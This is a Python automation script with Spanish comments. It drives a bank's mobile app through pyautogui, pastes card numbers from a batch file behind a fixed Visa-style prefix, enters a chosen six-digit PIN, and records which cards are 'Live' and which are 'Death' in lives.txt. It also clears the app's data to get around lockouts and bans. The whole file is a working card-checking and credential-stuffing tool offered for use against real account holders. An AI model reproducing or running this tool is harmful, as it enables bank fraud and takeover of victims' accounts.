import pyautogui 
import time
import datetime
#import pytesseract
from PIL import Image
from colorama import Fore, init
import pyperclip3 as pc

init()

#pytesseract.pytesseract.tesseract_cmd = r"D:\Tesseract-OCR\tesseract.exe"


linealote = 0
entendido = 276,638
continuar = 280,990
enOtroMomento = 287,691

#lugar_clave = 349,552
#cancelar = 1502,994
#ok_error = 1641,614


def click (pos,click = 1 ):
	pyautogui.moveTo(pos)
	pyautogui.click(clicks=click)

def buscarnumero(numero):
	

	image = "./imagenes/"+str(numero) + '.png'
	loc = None
	#time.sleep(0.5)
	while loc is None:
		time.sleep(0.1) # para ver	
		loc = pyautogui.locateOnScreen(image,grayscale=True, confidence=0.95, region=(0,746,579,315))
		#print(loc)
		if loc == None:
			print("Probable error...")
			print(numero)
			time.sleep(3)

	pyautogui.moveTo(loc)
	pyautogui.click()
	
	#input("Enter para continuar")
	#pyautogui.click(288,666)
	
def borrar(i):
	for i in range (1,i):
		pyautogui.click(89,1018)
		#time.sleep(0.1)
def reiniciando():
	time.sleep(1.2)
	pyautogui.click(584,966) # inicio
	time.sleep(1)
	pyautogui.moveTo(76,542)
	pyautogui.dragTo(76,542, duration=1) # Mantener pulsado en el icono
	time.sleep(0.5)
	pyautogui.click(77,690) #info
	time.sleep(1)
	pyautogui.click(142,398) #borrar
	time.sleep(1)
	pyautogui.click(455,635) #confirmar borrar
	time.sleep(0.7)
	pyautogui.click(584,966) # inicio
	time.sleep(0.7)
	pyautogui.click(76,542)
	time.sleep(10)
	pyautogui.click(96,1009)
	time.sleep(0.4)
	pyautogui.click(268,766)
	time.sleep(0.4)
	pyautogui.click(280,982)
	time.sleep(0.4)
	pyautogui.click(280,973)
		
lives = open("lives.txt","a")
print("*************************************")
print("Escriba los datos: ")
num1 = input("Numero 1 : ")
num2 = input("Numero 2 : ")
num3 = input("Numero 3 : ")
num4 = input("Numero 4 : ")
num5 = input("Numero 5 : ")
num6 = input("Numero 6 : ")

print("***************")
print("Presione 'Enter' para continuar")
input()
print("\n")
print("Corriendo Bot")
print("3")
time.sleep(0.3)
print("2")
time.sleep(0.3)
print("1")
print("\n")

var = True

with open ('./lote.txt') as texto:
	for x in texto:
		print("-------------------------------------------------------------")
		
		linealote += 1
		
		time.sleep(1)

		if (var):
			time.sleep(0.5)
			pyautogui.click(448,344) # tipo de tarjeta
			time.sleep(0.3)
			pyautogui.click(335,549) # visa clasica chip
			time.sleep(0.3)
			var = False

		pc.copy(x)
		pyautogui.doubleClick(282,436) # donde escribir la tarjeta
		time.sleep(0.1)
		pyautogui.hotkey('ctrl', 'v') # pegando lo copiado

		time.sleep(0.3)
		#print("clave de internet")
		pyautogui.click(293,540) # click clave de internet
		#pyautogui.click(319,337)

		sex = None
		time.sleep(0.3)
		numtempo = "./imagenes/3.png" 
		while (sex is None): #Esperando que cargue los numeros
			error1 = pyautogui.locateOnScreen(numtempo, grayscale=True, confidence=0.95, region=(0,746,579,315)) # x , y , ancho , alto
			if error1!=None: 
				break

		#print("Numeros!!")
		#calando del 1 al 6
		#print("45589500",x.rstrip())
		#print("Intentando 123456 ")

		#for j in range (1,7):
		#	buscarnumero(j)
			#time.sleep(1)
			#print(j)
		buscarnumero(num1)
		buscarnumero(num2)
		buscarnumero(num3)
		buscarnumero(num4)
		buscarnumero(num5)
		buscarnumero(num6)

		time.sleep(0.4)
		click(continuar)

		registro = open("registro.txt","w")
		registro.write(str(x)) # escribir en el block
		registro.write("\n")
		registro.close()

		
		#print("Verificando...")
		time.sleep(0.4)

		#Confirmacion :
		#Lives
		c = None
		d = None #ta
		e = None
		f = None
		b = None
		p = None
		q = None # ta
		r = None #ta
		u = None #ta
		w = None #ta

		contadorerror = 0
		contador = 0
		fechaActual = datetime.datetime.now()
		#flag = "flag1"
		while True: # Un " Y " poqe si no cumple 1 se rompe el bucle
			
			#contador += 1

			UsuarioNoAfiliado = "./imagenes/UsuarioNoAfiliado.png"
			b = pyautogui.locateOnScreen(UsuarioNoAfiliado, grayscale=True, region=(101,375,373,356))
			#print("B",b)
			if b!=None:
				print("Usuario No Afiliado")
				pyautogui.click(entendido)

				time.sleep(1)
				pyautogui.click(22,96)
				time.sleep(1)
				pyautogui.click(317,977)
				time.sleep(0.5)
				var = True
				break

			noExisInact = "./imagenes/noExisInact.png"
			r = pyautogui.locateOnScreen(noExisInact, grayscale=True, region=(101,375,373,356))
			#print("r",r)
			if r!=None:
				pyautogui.click(entendido)
				print("Usuario no existe o se encuentra inactivo")
				break

			nodispo = "./imagenes/SerivicioNodispo.png"
			c = pyautogui.locateOnScreen(nodispo, grayscale=True, region=(101,375,373,356))
			#print("c",c)
			if c!=None:
				print("Servicio no disponible")
				#pyautogui.click(277,615)
				print("Baneado pe creo.")
				input()
				break

			generarclave = "./imagenes/generarClave.png"
			w = pyautogui.locateOnScreen(generarclave, grayscale=True, region=(101,375,373,356))
			#print("c",c)
			if w!=None:
				print("Usuario debe generar clave de 6 digitos")
				pyautogui.click(entendido)

				time.sleep(1)
				pyautogui.click(22,96)
				time.sleep(1)
				pyautogui.click(317,977)
				time.sleep(0.5)
				var = True
				break

			IntentosExcedidos = "./imagenes/IntentosExcedidos.png"
			q = pyautogui.locateOnScreen(IntentosExcedidos, grayscale=True, region=(101,375,373,356))
			#print("c",c)
			if q!=None:
				print("Usuario inactivo por intentos exceditos")
				pyautogui.click(entendido)
				break

			Sesioninvalida = "./imagenes/Sesioninvalida.png"
			u = pyautogui.locateOnScreen(Sesioninvalida, grayscale=True, region=(101,375,373,356))
			#print("c",c)
			if u!=None:
				print("Sesion invalida")
				pyautogui.click(entendido)
				break

			# ------------------------------------------------------------------------------------------
			laif = "./imagenes/laif.png"
			f = pyautogui.locateOnScreen(laif, grayscale=True, region=(101,375,373,356))
			#print("f",f)
			if f!=None:
				print("YA TE ENCUENTRAS AFILIADO A TU BANCA MOVIL !!")
				click(entendido)
				var = True
				break

			if contadorerror > 5: # para marcar cualquiera
				enteimang_ = "./imagenes/enteimang_.png"
				d = pyautogui.locateOnScreen(enteimang_, grayscale=True, confidence=0.90, region=(101,375,373,356))
				#print("d",d)
				if d!=None:
					print("LO SENTIMOS... !!")
					click(entendido)
					var = True
					break
			
			if contadorerror > 28: # Por si no encuyentra ninguno
				print("-Ocurrió un error, actualice foto y enter....")	
				input()
				time.sleep(0.3)
				contadorerror = 1
				
			contadorerror += 1

		if (r!=None) or (c!=None) or (b!=None) or (u!=None) or (q!=None) or (r!=None) or (d!=None): # MORIDAS!!!
			print(Fore.RED + "")
			fechaActual2 = datetime.datetime.strftime(fechaActual, '%H:%M:%S')
			print(fechaActual2 , " | " , 'N. ' , linealote , ": " , "45589500" , x.rstrip()+" -------------> Death")
			print(Fore.WHITE +"")
			#Clickeando en reincio (esa equis del lado)
			#time.sleep(1)
			#print("Equis")
			

		if (f!=None): # Por si es LIVE:
			print ('\a')
			fechaActual2 = datetime.datetime.strftime(fechaActual,'%H:%M:%S')
			print(Fore.GREEN +"")
			print(fechaActual2, " | ","N. ", linealote ,": "," 45589500",x.rstrip()+" -------------> Live" , " | " + num1+num2+num3+num4+num5+num6)
			print(Fore.WHITE +"")
			lives = open("lives.txt","a")
			lives.write("45589500" + x.rstrip()) #escribir en el block
			lives.write("\n")
			lives.write(num1+num2+num3+num4+num5+num6)
			lives.write("\n")
			lives.write("+++++++++++++++++++++++++")
			lives.write("\n")
			lives.close()

			reiniciando()

			time.sleep(0.5)
		

lives.close()
print("Programa finalizado")
print("se quedo en la linea: ", linealote)
print("*****************")
print("Presione 'Enter' para Finalizar")
input()



